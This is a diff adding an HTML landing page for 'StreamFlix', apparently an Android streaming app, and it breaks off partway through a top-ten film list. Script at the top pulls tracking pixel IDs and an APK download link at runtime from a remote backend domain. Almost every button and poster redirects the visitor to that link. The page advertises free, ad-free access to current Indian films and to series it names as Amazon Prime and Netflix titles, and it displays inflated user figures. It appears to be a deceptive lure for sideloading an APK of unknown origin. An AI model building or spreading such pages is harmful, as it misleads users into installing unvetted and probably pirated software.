@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+
+       <script>
+var API_BASE = 'https://url.yuhd320k.site';
+// Facebook Pixel — 动态从后台加载所有像素ID
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+
+// 从后台 API 获取所有像素ID并初始化
+var _site=window.location.origin+window.location.pathname;
+console.log('前端站点(完整路径):',_site,' API:',API_BASE);
+fetch(API_BASE+'/api/pixels?site='+encodeURIComponent(_site))
+.then(function(r){return r.json()})
+.then(function(d){
+  console.log('像素API返回:',JSON.stringify(d));
+  var ids=d.ids||[];
+  if(!ids.length){ console.warn('像素ID列表为空，请前往后台配置。site='+_site+' matched='+(d._user||'none')); return; }
+  console.log('已加载像素ID:',ids); for(var i=0;i<ids.length;i++){ fbq('init',ids[i]); }
+  fbq('track','PageView');
+  var ns=document.createElement('div');
+  ns.style.display='none';
+  ns.innerHTML=ids.map(function(id){return '<img height="1" width="1" src="https://www.facebook.com/tr?id='+id+'&ev=PageView&noscript=1"/>'}).join('');
+  document.body.appendChild(ns);
+})
+.catch(function(){
+  console.warn('像素ID获取失败，请检查后台配置');
+});
+</script>
+<!-- End Meta Pixel Code -->
+
+<script>
+// ========== k2 — 动态获取APK下载地址并跳转 ==========
+var _apkUrl = '';
+async function k2(source) {
+    try {
+        if (!_apkUrl) {
+            var r = await fetch(API_BASE + '/api/apk-url?site=' + encodeURIComponent(_site));
+            var d = await r.json();
+            _apkUrl = d.url;
+            console.log('APK API返回:', JSON.stringify(d));
+        }
+        if (_apkUrl) {
+            window.location.href = _apkUrl;
+        } else {
+            alert('Failed to get APK download link. Please try again later.');
+        }
+    } catch (e) {
+        alert('Failed to get APK download link. Please try again later.');
+    }
+}
+</script>
+
+<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
+<title>StreamFlix — Movies &amp; Series in Your Pocket</title>
+<meta name="description" content="StreamFlix — Thousands of movies and series. Stream in HD and 4K. Download the APK for Android free. No ads.">
+<meta property="og:title" content="StreamFlix — Movies &amp; Series in Your Pocket">
+<meta property="og:description" content="Thousands of movies and series. Stream in HD and 4K. No ads.">
+<meta property="og:type" content="website">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+/* ============================================================
+   RESET
+   ============================================================ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{
+  scroll-behavior:smooth;
+  -webkit-text-size-adjust:100%;
+  -webkit-tap-highlight-color:transparent;
+  overflow-x:hidden;
+}
+body{
+  font-family:'Manrope',system-ui,-apple-system,sans-serif;
+  background:var(--bg);
+  color:var(--ink);
+  line-height:1.6;
+  -webkit-font-smoothing:antialiased;
+  text-rendering:optimizeLegibility;
+  overflow-x:hidden;
+}
+img,svg{display:block;max-width:100%}
+button{font:inherit;cursor:pointer;border:none;outline:none;background:none;color:inherit}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+:focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:4px}
+
+/* ============================================================
+   DESIGN TOKENS — Blush Romance (light)
+   ============================================================ */
+:root{
+  --bg:#121212;
+  --bg-2:#1A1A1A;
+  --surface:#1F1F1F;
+  --surface-2:#2A2A2A;
+  --ink:#FFFFFF;
+  --ink-2:#B8B8B8;
+  --ink-3:#808080;
+  --hairline:rgba(255,255,255,.12);
+  --hairline-strong:rgba(245,197,24,.4);
+  --accent:#F5C518;
+  --accent-2:#FFD44D;
+  --accent-deep:#F5C518;
+  --accent-soft:rgba(245,197,24,.13);
+  --accent-soft-2:rgba(245,197,24,.22);
+  --star:#F5C518;
+  --radius-sm:8px;
+  --radius:14px;
+  --radius-lg:20px;
+  --radius-xl:26px;
+  --radius-full:999px;
+  --font-display:'DM Serif Display',Georgia,'Times New Roman',serif;
+  --font-sans:'Manrope',system-ui,sans-serif;
+  --shadow-sm:0 1px 2px rgba(0,0,0,.4),0 4px 14px rgba(0,0,0,.32);
+  --shadow-md:0 2px 6px rgba(0,0,0,.45),0 14px 32px rgba(0,0,0,.4);
+  --shadow-lg:0 10px 30px rgba(0,0,0,.5),0 30px 60px rgba(0,0,0,.46);
+  --ease:cubic-bezier(.22,.61,.36,1);
+  --noise:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='160'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+}
+
+.grain{position:fixed;inset:0;z-index:2000;pointer-events:none;background-image:var(--noise);background-size:160px 160px;opacity:.06;mix-blend-mode:overlay}
+
+.wrap{max-width:480px;margin:0 auto;padding:0 20px}
+
+/* ============================================================
+   BUTTONS
+   ============================================================ */
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:10px;
+  font-weight:700;letter-spacing:-.01em;border-radius:var(--radius-full);
+  transition:transform .18s var(--ease),box-shadow .25s var(--ease),filter .2s;
+  white-space:nowrap;
+}
+.btn svg{width:18px;height:18px;flex-shrink:0}
+.btn-primary{
+  background:linear-gradient(135deg,var(--accent-2),var(--accent));
+  color:#121212;padding:16px 28px;font-size:1rem;
+  box-shadow:0 12px 32px rgba(245,197,24,.32),inset 0 1px 0 rgba(255,255,255,.35);
+}
+.btn-primary:hover{filter:brightness(1.05);transform:translateY(-2px);box-shadow:0 16px 40px rgba(245,197,24,.4)}
+.btn-primary:active{transform:translateY(0) scale(.97);filter:brightness(.98)}
+.btn-sm{padding:11px 20px;font-size:.875rem}
+.btn-sm svg{width:16px;height:16px}
+
+/* ============================================================
+   TOP BAR
+   ============================================================ */
+.topbar{
+  position:sticky;top:0;z-index:100;
+  background:rgba(12,10,15,.82);
+  backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
+  border-bottom:1px solid transparent;transition:border-color .3s;
+}
+.topbar.scrolled{border-bottom-color:var(--hairline)}
+.topbar-inner{display:flex;align-items:center;justify-content:space-between;gap:14px;height:62px}
+.wordmark{font-family:var(--font-display);font-size:1.5rem;letter-spacing:-.01em;line-height:1}
+.wordmark span{color:var(--accent)}
+
+/* ============================================================
+   HERO — text-first
+   ============================================================ */
+.hero{
+  position:relative;padding:42px 0 34px;
+  background:
+    radial-gradient(70% 55% at 88% 0%,rgba(245,197,24,.16),transparent 62%),
+    radial-gradient(50% 42% at 0% 100%,rgba(245,197,24,.10),transparent 60%);
+}
+.hero-badge{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:7px 14px;border-radius:var(--radius-full);
+  background:var(--accent-soft);border:1px solid var(--hairline-strong);
+  font-size:.68rem;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);
+  margin-bottom:18px;
+}
+.hero-badge .dot{width:6px;height:6px;border-radius:50%;background:var(--accent);box-shadow:0 0 10px rgba(245,197,24,.7)}
+.hero h1{
+  font-family:var(--font-display);font-weight:400;
+  font-size:clamp(2.9rem,13vw,4rem);line-height:.98;letter-spacing:-.015em;
+  margin-bottom:14px;text-wrap:balance;
+}
+.hero h1 em{font-style:italic;color:var(--accent)}
+.hero-sub{font-size:1rem;color:var(--ink-2);line-height:1.65;max-width:40ch;margin-bottom:24px;text-wrap:pretty}
+.hero-cta{width:100%;min-height:58px;margin-bottom:12px}
+.hero-note{text-align:center;font-size:.72rem;color:var(--ink-3);letter-spacing:.02em}
+
+/* metrics — floating card */
+.metrics{
+  position:relative;z-index:5;margin-top:-14px;
+  display:flex;border-radius:var(--radius-lg);
+  background:var(--surface);border:1px solid var(--hairline);
+  box-shadow:var(--shadow-lg);overflow:hidden;
+}
+.metric{flex:1;text-align:center;padding:18px 6px}
+.metric+.metric{border-left:1px solid var(--hairline)}
+.metric b{display:block;font-family:var(--font-display);font-weight:400;font-size:1.5rem;line-height:1;color:var(--accent);margin-bottom:4px;font-variant-numeric:tabular-nums}
+.metric span{font-size:.6rem;font-weight:600;color:var(--ink-3);text-transform:uppercase;letter-spacing:.08em}
+
+/* ============================================================
+   SECTION BASE
+   ============================================================ */
+.section{padding:46px 0}
+.section-head{margin-bottom:22px}
+.kicker{
+  display:flex;align-items:center;gap:10px;
+  font-size:.72rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;
+  color:var(--accent);margin-bottom:10px;
+}
+.kicker::after{content:'';flex:1;height:1px;background:var(--hairline)}
+.section-head h2{
+  font-family:var(--font-display);font-weight:400;
+  font-size:clamp(1.9rem,7.4vw,2.5rem);line-height:1.1;letter-spacing:-.01em;text-wrap:balance;
+}
+.section-head h2 em{font-style:italic;color:var(--accent)}
+.section-head .sub{margin-top:10px;font-size:.94rem;color:var(--ink-2);max-width:44ch;text-wrap:pretty}
+
+/* ============================================================
+   POSTER WALL — masonry (natural image ratio)
+   ============================================================ */
+.chart{display:flex;flex-direction:column;gap:16px}
+
+/* Featured No.1 spotlight */
+.chart-featured{
+  display:flex;align-items:center;gap:16px;cursor:pointer;
+  border-radius:22px;overflow:hidden;padding:16px;
+  background:linear-gradient(135deg,var(--accent-soft) 0%,var(--accent-soft-2) 100%);
+  border:1px solid var(--hairline-strong);box-shadow:var(--shadow-md);
+}
+.chart-featured .cf-media{flex:0 0 116px;position:relative;border-radius:14px;overflow:hidden;background:var(--bg-2);box-shadow:var(--shadow-sm)}
+.chart-featured .cf-media img{width:100%;aspect-ratio:3/4;object-fit:cover;display:block}
+.chart-featured .cf-badge{position:absolute;top:8px;left:8px;padding:3px 8px;border-radius:7px;background:var(--accent);color:#121212;font-size:.58rem;font-weight:800;letter-spacing:.08em;text-transform:uppercase;box-shadow:0 4px 12px rgba(245,197,24,.5)}
+.chart-featured .cf-body{min-width:0;display:flex;flex-direction:column;align-items:flex-start}
+.chart-featured .cf-tag{font-size:.62rem;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:var(--accent-deep);margin-bottom:6px}
+.chart-featured .cf-body h3{font-family:var(--font-display);font-size:1.5rem;line-height:1.05;color:var(--ink);margin-bottom:7px}
+.chart-featured .cf-body .genre{font-size:.6rem;font-weight:700;letter-spacing:.03em;text-transform:uppercase;color:var(--accent-deep);padding:4px 10px;border-radius:999px;background:rgba(245,197,24,.16);margin-bottom:9px}
+.chart-featured .cf-body .desc{font-size:.78rem;color:var(--ink-2);line-height:1.45}
+
+/* Rows 2-10 */
+.chart-list{display:flex;flex-direction:column;gap:12px}
+.chart-row{display:flex;align-items:flex-start;gap:14px;padding:13px;cursor:pointer;background:var(--surface);border:1px solid var(--hairline);border-radius:18px;box-shadow:var(--shadow-sm);transition:transform .18s ease,box-shadow .18s ease,border-color .18s ease}
+.chart-row:hover{transform:translateY(-2px);box-shadow:var(--shadow-md);border-color:var(--hairline-strong)}
+.chart-row .media{position:relative;flex:0 0 70px}
+.chart-row .media img{width:70px;height:94px;object-fit:cover;border-radius:12px;display:block;background:var(--bg-2);box-shadow:var(--shadow-sm)}
+.chart-row .media .rank{position:absolute;top:-5px;left:-5px;min-width:24px;height:24px;padding:0 6px;border-radius:999px;background:var(--accent);color:#121212;font-family:var(--font-sans);font-size:.74rem;font-weight:800;line-height:1;display:flex;align-items:center;justify-content:center;box-shadow:0 3px 10px rgba(245,197,24,.55);border:2px solid var(--surface)}
+.chart-row .cr-body{flex:1;min-width:0}
+.chart-row .cr-body h3{font-size:.96rem;font-weight:700;line-height:1.3;color:var(--ink);margin-bottom:6px}
+.chart-row .cr-body .genre{display:inline-block;font-size:.58rem;font-weight:700;letter-spacing:.03em;text-transform:uppercase;color:var(--accent-deep);padding:3px 8px;border-radius:999px;background:rgba(245,197,24,.14);margin-bottom:7px}
+.chart-row .cr-body .desc{font-size:.76rem;color:var(--ink-2);line-height:1.5}
+
+/* ============================================================
+   STATS BAND
+   ============================================================ */
+.statband{
+  margin-top:22px;border-radius:var(--radius-lg);
+  background:linear-gradient(150deg,var(--surface-2),#262626);
+  border:1px solid var(--hairline);display:flex;overflow:hidden;
+}
+.statband .cell{flex:1;text-align:center;padding:20px 8px}
+.statband .cell+.cell{border-left:1px solid var(--hairline)}
+.statband .cell b{display:block;font-family:var(--font-display);font-weight:400;font-size:1.7rem;line-height:1;color:var(--accent);margin-bottom:4px}
+.statband .cell span{font-size:.6rem;font-weight:600;color:var(--ink-3);text-transform:uppercase;letter-spacing:.08em}
+
+/* ============================================================
+   FEATURES — horizontal shelf
+   ============================================================ */
+.shelf{display:flex;gap:12px;overflow-x:auto;scroll-snap-type:x mandatory;padding:2px 20px 14px;margin:0 -20px;scrollbar-width:none}
+.shelf::-webkit-scrollbar{display:none}
+.shelf-card{
+  flex:0 0 74%;scroll-snap-align:center;padding:22px;
+  border-radius:var(--radius-lg);background:var(--surface);
+  border:1px solid var(--hairline);box-shadow:var(--shadow-sm);
+}
+.shelf-card .icon{
+  width:46px;height:46px;border-radius:12px;margin-bottom:16px;
+  background:var(--accent-soft);color:var(--accent);
+  display:flex;align-items:center;justify-content:center;border:1px solid var(--hairline-strong);
+}
+.shelf-card .icon svg{width:22px;height:22px}
+.shelf-card h3{font-size:1rem;font-weight:700;letter-spacing:-.01em;margin-bottom:6px}
+.shelf-card p{font-size:.84rem;color:var(--ink-2);line-height:1.55}
+.shelf-hint{margin-top:12px;text-align:center;font-size:.7rem;color:var(--ink-3);letter-spacing:.1em;text-transform:uppercase}
+
+/* feature banner */
+.feature-banner{
+  margin-top:26px;padding:28px 22px;border-radius:var(--radius-lg);
+  background:linear-gradient(150deg,var(--accent-soft),rgba(245,197,24,.08));
+  border:1px solid var(--hairline-strong);position:relative;overflow:hidden;
+}
+.feature-banner::before{content:'';position:absolute;top:-40px;right:-40px;width:160px;height:160px;border-radius:50%;background:radial-gradient(circle,rgba(245,197,24,.2),transparent 70%);pointer-events:none}
+.feature-banner h3{font-family:var(--font-display);font-weight:400;font-size:1.35rem;margin-bottom:18px;position:relative}
+.feature-banner ul{display:flex;flex-direction:column;gap:14px;position:relative}
+.feature-banner li{display:flex;align-items:flex-start;gap:11px;font-size:.84rem;color:var(--ink-2);line-height:1.5}
+.feature-banner li strong{color:var(--ink)}
+.feature-banner li .d{width:6px;height:6px;min-width:6px;border-radius:50%;background:var(--accent);margin-top:7px}
+
+/* ============================================================
+   REVIEWS — single spotlight
+   ============================================================ */
+.spotlight{position:relative;border-radius:var(--radius-lg);overflow:hidden;background:var(--surface);border:1px solid var(--hairline);box-shadow:var(--shadow-sm)}
+.spotlight-track{display:flex;transition:transform .5s var(--ease)}
+.review{flex:0 0 100%;padding:30px 24px;text-align:center}
+.review .qmark{font-family:var(--font-display);font-size:3.4rem;line-height:.6;color:var(--accent-soft);display:block;margin-bottom:18px}
+.review .stars{display:flex;justify-content:center;gap:3px;margin-bottom:16px}
+.review .stars svg{width:16px;height:16px;color:var(--star)}
+.review p{font-size:1rem;color:var(--ink-2);line-height:1.66;font-style:italic;margin-bottom:20px;text-wrap:pretty}
+.review .who{display:flex;align-items:center;justify-content:center;gap:11px}
+.review .who .av{width:44px;height:44px;border-radius:50%;object-fit:cover;display:block;border:2px solid var(--accent-soft-2);box-shadow:var(--shadow-sm)}
+.review .who .n{font-size:.88rem;font-weight:700}
+.review .who .t{font-size:.72rem;color:var(--ink-3)}
+.spot-dots{display:flex;justify-content:center;gap:8px;margin-top:16px}
+.spot-dot{width:7px;height:7px;border-radius:50%;background:var(--bg-2);border:1px solid var(--hairline-strong);transition:all .3s var(--ease)}
+.spot-dot.on{background:var(--accent);border-color:var(--accent);width:20px;border-radius:var(--radius-full)}
+
+/* ============================================================
+   NUMBERS
+   ============================================================ */
+.numbers{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}
+.number{padding:26px 16px;border-radius:var(--radius-lg);text-align:center;background:var(--surface);border:1px solid var(--hairline);box-shadow:var(--shadow-sm)}
+.number b{display:block;font-family:var(--font-display);font-weight:400;font-size:2.3rem;line-height:1;color:var(--accent);margin-bottom:6px}
+.number span{font-size:.62rem;font-weight:600;color:var(--ink-3);text-transform:uppercase;letter-spacing:.08em}
+
+/* ============================================================
+   SECURITY
+   ============================================================ */
+.security{display:flex;flex-direction:column}
+.security-row{display:flex;align-items:center;gap:14px;padding:18px 0;border-bottom:1px solid var(--hairline)}
+.security-row:last-child{border-bottom:none}
+.security-row .icon{width:44px;height:44px;min-width:44px;border-radius:12px;background:var(--accent-soft);color:var(--accent);display:flex;align-items:center;justify-content:center;border:1px solid var(--hairline-strong)}
+.security-row .icon svg{width:20px;height:20px}
+.security-row .txt strong{display:block;font-size:.9rem;font-weight:700;margin-bottom:2px}
+.security-row .txt span{font-size:.78rem;color:var(--ink-2);line-height:1.45}
+
+/* ============================================================
+   DOWNLOAD — rose-tinted finale
+   ============================================================ */
+.download{
+  margin:10px -20px 0;padding:64px 20px;
+  background:radial-gradient(80% 60% at 50% 0%,rgba(245,197,24,.16),transparent 60%),linear-gradient(180deg,#1A1708,#121212);
+  border-top:1px solid var(--hairline);border-bottom:1px solid var(--hairline);text-align:center;
+}
+.download .kicker{justify-content:center}
+.download .kicker::after{display:none}
+.download h2{font-family:var(--font-display);font-weight:400;font-size:clamp(2rem,8vw,2.7rem);line-height:1.06;letter-spacing:-.01em;margin-bottom:14px}
+.download h2 em{font-style:italic;color:var(--accent)}
+.download p{font-size:.94rem;color:var(--ink-2);line-height:1.6;max-width:40ch;margin:0 auto 26px}
+.download .btn-primary{width:100%;max-width:320px;font-size:1.05rem;padding:17px 32px}
+.download .note{margin-top:16px;font-size:.74rem;color:var(--ink-3)}
+
+/* ============================================================
+   FAQ
+   ============================================================ */
+.faq{display:flex;flex-direction:column}
+.faq-entry{border-bottom:1px solid var(--hairline)}
+.faq-entry:first-child{border-top:1px solid var(--hairline)}
+.faq-q{display:flex;align-items:center;justify-content:space-between;gap:14px;width:100%;text-align:left;padding:20px 0;font-size:.95rem;font-weight:600;color:var(--ink);transition:color .2s}
+.faq-q:hover{color:var(--accent)}
+.faq-ind{width:28px;height:28px;min-width:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:var(--surface-2);border:1px solid var(--hairline);color:var(--ink-2);transition:transform .35s var(--ease),background .3s,color .3s}
+.faq-ind svg{width:14px;height:14px}
+.faq-entry.open .faq-q{color:var(--accent)}
+.faq-entry.open .faq-ind{transform:rotate(45deg);background:var(--accent);border-color:var(--accent);color:#121212}
+.faq-a{max-height:0;overflow:hidden;transition:max-height .45s var(--ease)}
+.faq-entry.open .faq-a{max-height:440px}
+.faq-a-inner{padding:0 0 22px;font-size:.9rem;color:var(--ink-2);line-height:1.7;max-width:60ch}
+
+/* ============================================================
+   FOOTER
+   ============================================================ */
+.footer{padding:28px 0;text-align:center;font-size:.72rem;color:var(--ink-3);border-top:1px solid var(--hairline)}
+.footer a{color:var(--ink-2);font-weight:600;transition:color .2s}
+.footer a:active{color:var(--accent)}
+.footer .links{display:flex;justify-content:center;gap:18px;margin-top:8px}
+
+/* ============================================================
+   FLOAT BAR
+   ============================================================ */
+.floatbar{
+  position:fixed;bottom:0;left:0;right:0;z-index:120;
+  padding:12px 20px max(12px,env(safe-area-inset-bottom));
+  background:rgba(12,10,15,.88);
+  backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);
+  border-top:1px solid var(--hairline);
+}
+.floatbar .btn-primary{width:100%;min-height:52px;font-size:.95rem;animation:breathe 2.4s ease-in-out infinite}
+.floatbar .btn-primary:active{filter:brightness(.92)}
+
+@keyframes breathe{
+  0%,100%{transform:scale(1);box-shadow:0 12px 32px rgba(245,197,24,.32),inset 0 1px 0 rgba(255,255,255,.35)}
+  50%{transform:scale(1.035);box-shadow:0 18px 46px rgba(245,197,24,.55),0 0 0 8px rgba(245,197,24,.16),inset 0 1px 0 rgba(255,255,255,.35)}
+}
+
+/* ============================================================
+   MARKETING ELEMENTS
+   ============================================================ */
+.hero-chips{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin:2px 0 6px}
+.hero-chip{display:inline-flex;align-items:center;gap:7px;padding:6px 12px;border-radius:var(--radius-full);background:var(--surface);border:1px solid var(--hairline);font-size:.72rem;font-weight:600;color:var(--ink-2)}
+.hero-chip::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--accent)}
+
+.chart-featured .cf-meta{display:flex;align-items:center;gap:10px;margin-bottom:9px;flex-wrap:wrap}
+.chart-featured .cf-meta .rate{font-size:.78rem;font-weight:800;color:var(--star)}
+.chart-featured .cf-meta .views{font-size:.74rem;font-weight:600;color:var(--ink-2)}
+.chart-featured .cf-meta .hd{font-size:.6rem;font-weight:800;letter-spacing:.08em;text-transform:uppercase;color:#121212;background:var(--accent);padding:2px 7px;border-radius:5px}
+
+.chart-row .cr-meta{display:flex;align-items:center;gap:9px;margin-top:7px}
+.chart-row .cr-meta .rate{font-size:.72rem;font-weight:800;color:var(--star)}
+.chart-row .cr-meta .views{font-size:.7rem;font-weight:600;color:var(--ink-3)}
+
+.urgency{display:inline-flex;align-items:center;gap:9px;margin:0 auto 18px;padding:8px 16px;border-radius:var(--radius-full);background:rgba(245,197,24,.13);border:1px solid var(--hairline-strong);font-size:.78rem;font-weight:700;color:var(--accent-deep)}
+.urgency .pulse{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 0 0 rgba(245,197,24,.5);animation:ping 1.6s ease-out infinite}
+@keyframes ping{0%{box-shadow:0 0 0 0 rgba(245,197,24,.5)}80%,100%{box-shadow:0 0 0 9px rgba(245,197,24,0)}}
+
+/* ============================================================
+   REVEAL
+   ============================================================ */
+.reveal{opacity:0;transform:translateY(24px);transition:opacity .7s var(--ease),transform .7s var(--ease)}
+.reveal.visible{opacity:1;transform:translateY(0)}
+
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important;scroll-behavior:auto!important}
+}
+</style>
+</head>
+<body>
+<div class="grain" aria-hidden="true"></div>
+
+<!-- ============================================================
+     TOP BAR
+     ============================================================ -->
+<div class="topbar" id="topbar">
+  <div class="wrap topbar-inner">
+    <div class="wordmark">Stream<span>Flix</span></div>
+    <button class="btn btn-primary btn-sm" onclick="k2()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      Download
+    </button>
+  </div>
+</div>
+
+<main class="wrap">
+
+<!-- ============================================================
+     HERO
+     ============================================================ -->
+<section class="hero">
+  <div class="hero-badge"><span class="dot"></span> #1 Movie App · 2026</div>
+  <h1>Movies, <em>big emotions</em></h1>
+  <p class="hero-sub">Thousands of movies and series. Stream in HD and 4K. Download and watch offline. New releases every week. No ads.</p>
+  <button class="btn btn-primary hero-cta" onclick="k2()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+    Download Free — Watch Now
+  </button>
+  <div class="hero-chips">
+    <span class="hero-chip">Free forever</span>
+    <span class="hero-chip">No ads</span>
+    <span class="hero-chip">HD &amp; 4K</span>
+  </div>
+  <p class="hero-note">Scroll to discover more</p>
+</section>
+
+<!-- metrics -->
+<div class="metrics reveal">
+  <div class="metric"><b>50M+</b><span>Users</span></div>
+  <div class="metric"><b>4.8&#9733;</b><span>Movies</span></div>
+  <div class="metric"><b>4K</b><span>Quality</span></div>
+</div>
+
+<!-- ============================================================
+     POSTER WALL
+     ============================================================ -->
+<section class="section reveal">
+  <div class="section-head">
+    <div class="kicker">Trending</div>
+    <h2>What everyone <em>is watching</em></h2>
+    <p class="sub">The top 10 most-watched movies this week.</p>
+  </div>
+
+  <div class="chart">
+    <div class="chart-featured" onclick="k2()">
+      <div class="cf-media">
+        <img src="img/c1.jpg" alt="Dhurandhar 2" loading="lazy">
+        <span class="cf-badge">No. 1</span>
+      </div>
+      <div class="cf-body">
+        <div class="cf-tag">Now Trending</div>
+        <h3>Dhurandhar 2</h3>
+        <div class="genre">Action / Drama</div>
+        <div class="cf-meta"><span class="rate">★ 4.9</span><span class="views">42M views</span><span class="hd">4K</span></div>
+        <p class="desc">The biggest Indian box office hit of 2026. A highly anticipated sequel, the film continues the previous story as its protagonist faces even tougher challenges in a whirlwind of power and morality.</p>
+      </div>
+    </div>
+
+    <div class="chart-list">
+      <div class="chart-row" onclick="k2()">
+        <div class="media">
+          <img src="img/c2.jpg" alt="Border 2" loading="lazy">
+          <span class="rank">2</span>
+        </div>
+        <div class="cr-body">
+          <h3>Border 2</h3>
+          <div class="genre">War / History / Action</div>
+          <p class="desc">The sequel to the 1997 war classic 'Border'. The film recreates the Battle of Longewala from the 1971 Indo-Pakistani War, capturing the courage and patriotism of Indian soldiers.</p>
+          <div class="cr-meta"><span class="rate">★ 4.8</span><span class="views">38M views</span></div>
+        </div>
+      </div>
+      <div class="chart-row" onclick="k2()">
+        <div class="media">
+          <img src="img/c3.jpg" alt="Bhooth Bangla" loading="lazy">
+          <span class="rank">3</span>
+        </div>
+        <div class="cr-body">
+          <h3>Bhooth Bangla</h3>
+          <div class="genre">Horror / Comedy</div>
+          <p class="desc">A horror comedy. The protagonist breaks into an old mansion with a terrifying reputation, turning supernatural chaos into a series of hilarious adventures against its 'invisible' residents.</p>
+          <div class="cr-meta"><span class="rate">★ 4.6</span><span class="views">27M views</span></div>
+        </div>
+      </div>
+      <div class="chart-row" onclick="k2()">
+        <div class="media">
+          <img src="img/c4.jpg" alt="Dhamaal 4" loading="lazy">
+          <span class="rank">4</span>
+        </div>
+        <div class="cr-body">
+          <h3>Dhamaal 4</h3>
+          <div class="genre">Action / Comedy</div>
+          <p class="desc">The fourth installment of the hit action-comedy franchise 'Dhamaal'. Continuing the series' signature madcap humor, a group of characters plunge into yet another side-splitting mess.</p>
+          <div class="cr-meta"><span class="rate">★ 4.5</span><span class="views">31M views</span></div>
+        </div>
+      </div>
+      <div class="chart-row" onclick="k2()">
+        <div class="media">
+          <img src="img/c5.jpg" alt="Welcome To The Jungle" loading="lazy">
+          <span class="rank">5</span>
+        </div>
+        <div class="cr-body">
+          <h3>Welcome To The Jungle</h3>
+          <div class="genre">Action / Comedy</div>
+          <p class="desc">The latest sequel in the hit comedy franchise 'Welcome'. Boasting a star-studded comedy ensemble, the story unfolds in the jungle with one riotous escapade after another.</p>
+          <div class="cr-meta"><span class="rate">★ 4.7</span><span class="views">29M views</span></div>
+        </div>
+      </div>
+      <div class="chart-row" onclick="k2()">
+        <div class="media">
+          <img src="img/c6.jpg" alt="King" loading="lazy">
+          <span class="rank">6</span>
+        </div>
+        <div class="cr-body">
+          <h3>King</h3>
+          <div class="genre">Action / Thriller</div>
+          <p class="desc">One of the most anticipated films of 2026. Starring Shah Rukh Khan and Deepika Padukone, it follows a mentor and protégé fighting to survive in a dangerous world.</p>
+          <div class="cr-meta"><span class="rate">★ 4.9</span><span class="views">35M views</span></div>
+        </div>
+      </div>
+      <div class="chart-row" onclick="k2()">
+        <div class="media">
+          <img src="img/c7.jpg" alt="Panchayat" loading="lazy">
+          <span class="rank">7</span>
+        </div>
+        <div class="cr-body">
+          <h3>Panchayat</h3>
+          <div class="genre">Drama / Comedy</div>
+          <p class="desc">A beloved rural comedy-drama. It follows a city graduate posted to a village in Madhya Pradesh as the secretary of the local panchayat.</p>
+          <div class="cr-meta"><span class="rate">★ 4.8</span><span class="views">24M views</span></div>
+        </div>
+      </div>
+      <div class="chart-row" onclick="k2()">
+        <div class="media">
+          <img src="img/c8.jpg" alt="Mirzapur" loading="lazy">
+          <span class="rank">8</span>
+        </div>
+        <div class="cr-body">
+          <h3>Mirzapur</h3>
+          <div class="genre">Crime / Drama / Action</div>
+          <p class="desc">Amazon Prime Video's flagship gangster series. In the new season, the war for the Purvanchal region escalates as rival forces clash in a political power struggle involving Kaleen Bhaiya, Guddu, and others.</p>
+          <div class="cr-meta"><span class="rate">★ 4.7</span><span class="views">46M views</span></div>
+        </div>
+      </div>
+      <div class="chart-row" onclick="k2()">
+        <div class="media">
+          <img src="img/c9.jpg" alt="Alpha" loading="lazy">
+          <span class="rank">9</span>
+        </div>
+        <div class="cr-body">
+          <h3>Alpha</h3>
+          <div class="genre">Action / Thriller / Spy</div>
+          <p class="desc">A female-led spy action film. Two fierce agents carry out a series of dangerous missions, confronting every kind of risk and challenge in the world of espionage.</p>
+          <div class="cr-meta"><span class="rate">★ 4.6</span><span class="views">19M views</span></div>
+        </div>
+      </div>
+      <div class="chart-row" onclick="k2()">
+        <div class="media">
+          <img src="img/c10.jpg" alt="Taskaree" loading="lazy">
+          <span class="rank">10</span>
+        </div>
+        <div class="cr-body">
+          <h3>Taskaree</h3>
+          <div class="genre">Drama / Crime</div>
+          <p class="desc">A breakout hit of the first half of the year, racking up 14.2 million views on Netflix.</p>
